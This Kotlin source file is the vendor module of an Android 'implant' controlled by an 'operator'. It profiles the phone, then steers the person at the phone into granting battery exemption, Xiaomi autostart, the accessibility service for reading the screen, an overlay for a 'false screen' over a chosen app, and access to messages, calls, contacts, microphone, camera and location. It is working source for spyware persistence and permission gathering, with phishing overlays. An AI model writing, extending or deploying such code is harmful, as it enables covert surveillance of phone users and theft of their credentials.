package io.umbra.beacon

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.usage.UsageStatsManager
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings

/**
 * The rules of the manufacturer.
 *
 * An ordinary application on a phone is killed by the operating system
 * when the system feels like it: the battery manager, the standby bucket,
 * the notification permission, and -- on the skins of Xiaomi -- the
 * autostart list.  A boot receiver alone is not enough on those phones:
 * the receiver runs once after the boot, and then the system stops the
 * application twenty minutes later because it is not allowed to start on
 * its own.  The implant survives on a Redmi only when the user has
 * allowed it to start by itself.
 *
 * The module answers two questions:
 *
 *   * what does the system say about the implant right now?
 *   * what has to be done, and where, so the implant survives?
 *
 * The second answer is a list of steps, and every step carries the screen
 * that shows it.  The implant cannot take the permission itself -- on
 * those phones the user has to press the button -- so the implant opens
 * the screen and says what to press.  What the system does not tell is
 * reported as unknown rather than guessed: the autostart list of Xiaomi
 * is not readable by an application, so the implant says that the user has
 * to look at it.
 */
object Vendor {
    /** The action of the screen that lists the applications that may start on their own. */
    private const val MIUI_AUTOSTART_ACTION = "miui.intent.action.OP_AUTO_START"

    /** The screen of the permission centre of Xiaomi that holds the autostart list. */
    private const val MIUI_AUTOSTART_COMPONENT =
        "com.miui.securitycenter/com.miui.permcenter.autostart.AutoStartManagementActivity"

    /** The channel the guidance notification travels on. */
    private const val GUIDE_CHANNEL = "umbra.guide"

    /**
     * One thing the operator has to do, and the screen that shows it.
     *
     * The state of a step is a word and not a flag: "yes", "no" or
     * "unknown".  The autostart list of a Xiaomi is not readable, and a
     * step that cannot be read is unknown, not done.
     */
    data class Step(
        val id: String,
        val title: String,
        val why: String,
        val state: String,
        val action: String? = null,
        val component: String? = null,
        val data: String? = null,
    )

    /** The manufacturer of the phone. */
    fun vendor(): String = (Build.MANUFACTURER ?: "unknown").lowercase()

    /** The brand of the phone: "redmi", "xiaomi", "poco" and so on. */
    fun brand(): String = (Build.BRAND ?: "unknown").lowercase()

    /**
     * The skin of the phone.
     *
     * The build display string is the public way to see it: the skins of
     * Xiaomi put "MIUI" or "HyperOS" in it, Huawei puts "EMUI", and the
     * skins of Oppo, Vivo and Asus put their own names there.
     */
    fun skin(): String {
        val display = (Build.DISPLAY ?: "").lowercase()
        return when {
            display.contains("hyperos") -> "hyperos"
            display.contains("miui") -> "miui"
            display.contains("emui") -> "emui"
            display.contains("coloros") -> "coloros"
            display.contains("funtouch") -> "funtouch"
            display.contains("originui") -> "originui"
            display.contains("one ui") -> "oneui"
            display.contains("zenui") || display.contains("myux") -> "zenui"
            display.contains("lineage") -> "lineage"
            display.isEmpty() -> "unknown"
            else -> display.take(40)
        }
    }

    /** Is this a phone of Xiaomi? The autostart list only exists there. */
    fun isXiaomi(): Boolean {
        val vendor = vendor()
        val brand = brand()
        return vendor.contains("xiaomi") || vendor.contains("redmi") ||
            brand.contains("xiaomi") || brand.contains("redmi") ||
            brand.contains("poco") || skin() == "miui" || skin() == "hyperos"
    }

    /**
     * What the system says about the implant right now.
     *
     * Every value is a word, because "the phone does not tell" is an
     * answer the operator has to see too.
     */
    fun state(context: Context): Map<String, String> {
        val out = LinkedHashMap<String, String>()
        out["vendor"] = vendor()
        out["brand"] = brand()
        out["model"] = "${Build.MANUFACTURER ?: "?"} ${Build.MODEL ?: "?"}"
        out["skin"] = skin()
        val power = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
        out["screen_on"] = if (power == null) "unknown" else power.isInteractive.toString()
        out["doze"] = if (power == null) "unknown" else power.isDeviceIdleMode.toString()
        out["battery_exempt"] = if (power == null) {
            "unknown"
        } else {
            power.isIgnoringBatteryOptimizations(context.packageName).toString()
        }
        // The standby bucket of an application is the usage stats manager's,
        // not the power manager's: getAppStandbyBucket() is the bucket of the
        // calling application and needs no permission to read.
        val usage = context.getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager
        out["standby_bucket"] = if (usage == null) "unknown" else bucketName(usage.appStandbyBucket)
        val notifications = context.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
        out["notifications"] = if (notifications == null) {
            "unknown"
        } else {
            notifications.areNotificationsEnabled().toString()
        }
        // The accessibility service is the one permission that gives the
        // operator the screen of the phone, so the guide says whether it is
        // on.
        out["accessibility"] = Ui.isEnabled().toString()
        // The dangerous permissions of the senses: the operator has to
        // know which of them the user of the phone granted.
        val permissions = Sense.permissions(context)
        var granted = 0
        for ((key, value) in permissions) {
            out["perm_$key"] = value.toString()
            if (value) granted++
        }
        out["permissions"] = "$granted of ${permissions.size} granted"
        // The overlay of the false screen is a permission of its own.
        out["overlay"] = Sense.granted(context, android.Manifest.permission.SYSTEM_ALERT_WINDOW).toString()
        return out
    }

    /**
     * The steps the operator has to take, with the screen that shows each
     * of them.
     *
     * The list is the same everywhere and the steps that do not apply are
     * not in it: a phone that is not a Xiaomi has no autostart list, so
     * the step is not there.
     */
    fun steps(context: Context): List<Step> {
        val out = mutableListOf<Step>()
        val power = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
        val usage = context.getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager
        val packageName = context.packageName

        out.add(
            Step(
                id = "battery",
                title = "let the implant run without the battery optimisation",
                why = "the system stops the applications that are not on the list, and the implant is killed in the middle of the night",
                state = if (power == null) {
                    "unknown"
                } else if (power.isIgnoringBatteryOptimizations(packageName)) {
                    "yes"
                } else {
                    "no"
                },
                action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                data = "package:$packageName",
            ),
        )

        if (isXiaomi()) {
            // The autostart list cannot be read: the application is not
            // told whether it is on it.  The step stays "unknown" until
            // the operator looks at the screen.
            val intent = Intent(MIUI_AUTOSTART_ACTION)
            intent.component = ComponentName(
                "com.miui.securitycenter",
                "com.miui.permcenter.autostart.AutoStartManagementActivity",
            )
            val known = resolves(context, intent)
            out.add(
                Step(
                    id = "autostart",
                    title = "let the implant start on its own",
                    why = "the skin of Xiaomi keeps a list of the applications that may start themselves; a boot receiver alone is not enough",
                    state = "unknown",
                    action = if (known) MIUI_AUTOSTART_ACTION else Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    component = if (known) MIUI_AUTOSTART_COMPONENT else null,
                    data = if (known) null else "package:$packageName",
                ),
            )
        }

        val notifications = context.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
        out.add(
            Step(
                id = "notifications",
                title = "let the implant show its notification",
                why = "a foreground service without a notification is killed by the system on many phones",
                state = if (notifications == null) {
                    "unknown"
                } else if (notifications.areNotificationsEnabled()) {
                    "yes"
                } else {
                    "no"
                },
                action = Settings.ACTION_APP_NOTIFICATION_SETTINGS,
                data = "package:$packageName",
            ),
        )

        out.add(
            Step(
                id = "accessibility",
                title = "let the operator read the screen of the phone",
                why = "the accessibility service keeps the implant alive, and it is the only way to see what the user is looking at; the user of the phone sees it in the settings",
                state = if (Ui.isEnabled()) "yes" else "no",
                action = Settings.ACTION_ACCESSIBILITY_SETTINGS,
            ),
        )

        val permissions = Sense.permissions(context)
        val missing = permissions.filter { !it.value }.keys.toList()
        out.add(
            Step(
                id = "permissions",
                title = "let the implant use the senses of the phone",
                why = "the location, the messages, the calls, the contacts, the microphone and the camera are behind permissions that only the user of the phone can grant" +
                    if (missing.isEmpty()) {
                        ""
                    } else {
                        "; the missing ones are ${missing.joinToString(", ")}"
                    },
                state = if (missing.isEmpty()) "yes" else "no",
                action = Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                data = "package:$packageName",
            ),
        )

        out.add(
            Step(
                id = "overlay",
                title = "let the implant draw over the other applications",
                why = "the false screen of the phone is drawn over the application the operator named; the permission is in the settings of the phone",
                state = if (Sense.granted(context, android.Manifest.permission.SYSTEM_ALERT_WINDOW)) {
                    "yes"
                } else {
                    "no"
                },
                action = Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                data = "package:$packageName",
            ),
        )

        out.add(
            Step(
                id = "standby",
                title = "keep the implant out of the rare bucket",
                why = "the bucket decides how often the system lets the application do anything at all",
                state = if (usage == null) {
                    "unknown"
                } else if (usage.appStandbyBucket == UsageStatsManager.STANDBY_BUCKET_RARE) {
                    "rare"
                } else {
                    "kept"
                },
                action = Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                data = "package:$packageName",
            ),
        )
        return out
    }

    /** The guide as a report for the operator. */
    fun report(context: Context): String {
        val out = StringBuilder()
        val state = state(context)
        out.append("guide: the phone is a ${state["model"]} with the ${state["skin"]} skin\n")
        for ((key, value) in state) {
            if (key == "model" || key == "skin") continue
            out.append("guide: $key is $value\n")
        }
        for (step in steps(context)) {
            out.append("guide: [${step.state}] ${step.title}: ${step.why}\n")
        }
        out.append(
            "guide: the implant cannot take these permissions by itself; the user of the phone has to press the button\n",
        )
        return out.toString()
    }

    /**
     * Show the screen of a step.
     *
     * The phone blocks an application that opens a screen from the
     * background, so the step travels as a notification as well: the user
     * taps it and the screen opens.  The report says which of the two
     * happened.
     */
    fun show(context: Context, stepId: String): String {
        val step = steps(context).firstOrNull { it.id == stepId }
            ?: return "guide: there is no step called $stepId\n"
        val intent = intentFor(context, step)
            ?: return "guide: the step ${step.id} has no screen to show\n"
        val notified = notify(context, step, intent)
        return try {
            context.startActivity(intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
            "guide: the screen of '${step.title}' was opened (the notification carries it too: $notified)\n"
        } catch (t: Throwable) {
            "guide: the screen of '${step.title}' could not be opened ($notified): ${t.message ?: "the system refused"}\n"
        }
    }

    /** The intent that shows the screen of a step. */
    private fun intentFor(context: Context, step: Step): Intent? {
        val action = step.action ?: return null
        val intent = Intent(action)
        val data = step.data
        if (data != null) {
            intent.data = Uri.parse(data)
            if (action == Settings.ACTION_APP_NOTIFICATION_SETTINGS) {
                intent.putExtra(Settings.EXTRA_APP_PACKAGE, context.packageName)
            }
        }
        val component = step.component
        if (component != null) {
            val parts = component.split("/")
            if (parts.size == 2) {
                intent.component = ComponentName(parts[0], parts[1])
            }
        }
        return intent
    }

    /**
     * Put the step on the screen as a notification.
     *
     * The notification is the path that works: an application in the
     * background may not open a screen, but the user may tap one.
     */
    private fun notify(context: Context, step: Step, intent: Intent): String {
        return try {
            val manager = context.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
            if (manager == null) {
                return "the phone has no notification manager"
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    GUIDE_CHANNEL,
                    "the guidance of the implant",
                    NotificationManager.IMPORTANCE_HIGH,
                )
                manager.createNotificationChannel(channel)
            }
            val pending = PendingIntent.getActivity(
                context,
                step.id.hashCode(),
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
            )
            val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.app.Notification.Builder(context, GUIDE_CHANNEL)
            } else {
                android.app.Notification.Builder(context)
            }
            builder.setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle(step.title)
                .setContentText(step.why)
                .setAutoCancel(true)
                .setContentIntent(pending)
            manager.notify(step.id.hashCode(), builder.build())
            "the notification is on the screen"
        } catch (t: Throwable) {
            "the notification could not be shown: ${t.message ?: "the system refused"}"
        }
    }

    /** Does this phone have the screen? */
    private fun resolves(context: Context, intent: Intent): Boolean {
        return try {
            context.packageManager.resolveActivity(intent, 0) != null
        } catch (t: Throwable) {
            false
        }
    }

    /** The name of the standby bucket the phone put the implant in. */
    private fun bucketName(bucket: Int): String = when (bucket) {
        UsageStatsManager.STANDBY_BUCKET_ACTIVE -> "active"
        UsageStatsManager.STANDBY_BUCKET_WORKING_SET -> "working_set"
        UsageStatsManager.STANDBY_BUCKET_FREQUENT -> "frequent"
        UsageStatsManager.STANDBY_BUCKET_RARE -> "rare"
        else -> "unknown"
    }
}
